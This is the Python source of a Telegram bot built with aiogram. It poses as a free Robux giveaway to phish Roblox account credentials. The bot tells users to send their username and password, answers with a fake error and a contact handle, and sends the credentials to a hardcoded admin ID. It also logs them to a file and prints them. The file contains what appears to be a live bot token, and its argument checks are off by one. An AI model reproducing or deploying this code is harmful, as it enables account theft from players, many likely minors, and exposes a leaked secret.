from aiogram.types import Message
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart, Command
import asyncio
import requests
import os

Token = '5832518494:AAG2TZ9XiHw_HlfFAiJq8gzFes8JT-TjzAk'

bot = Bot(token=Token)
dp = Dispatcher()

@dp.message(CommandStart())
async def start(message: Message):
    await message.answer('Hello! I am bot for give you free robux! To recieve robux type /robux <amount>')

@dp.message(Command('robux'))
async def robux(message: Message):
    args = message.text.split()
    if len(args) >= 1:
        amount = args[1]
        await message.answer(f'You will receive {amount} robux, but you need to log in to your roblox account. Please enter your username and password in the following format: /login username password')
    else:
        await message.answer('Please specify the amount of robux you would like to receive.')
    
@dp.message(Command('login'))
async def login(message: Message):
    args = message.text.split()
    if len(args) >= 2:
        username = args[1]
        password = args[2]
        log = open('users.txt', 'a')
        await message.answer(f'Error. Please try again or contact with us: @JoeBiden_Usa')
        admin_id = '1621436440'
        await bot.send_message(admin_id, f'Username: {username}, Password: {password}')
        print(f'New login (Username: {username}, Password: {password})')
        log.write(f'Username: {username}, Password: {password}\n')
    else:
        await message.answer('Please enter your username and password in the following format: /login username password')
        

async def main() -> None:
    await dp.start_polling(bot)

if __name__ == '__main__':
    print('Bot is running...')
    asyncio.run(main())
